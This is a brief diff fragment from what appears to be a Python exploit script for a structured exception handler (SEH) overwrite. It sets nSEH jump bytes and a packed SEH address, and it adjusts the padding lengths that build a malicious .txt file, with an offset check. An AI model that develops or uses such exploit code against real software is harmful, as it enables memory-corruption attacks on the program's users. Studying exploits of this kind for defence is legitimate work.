@@ -50,8 +50,8 @@ nseh = "\x71\x9F\x70\x9F"
 seh = pack("<L", 0x00435133)
 file_extension = ".txt"
 
-payload = "A" * 169
-payload += "B" * 125
+payload = "A" * 171
+payload += "B" * 123
 if len(payload) != nseh_offset:
     print(
         "[!] nSEH offset is {cur_offset}, expected {exp_offset}".format(
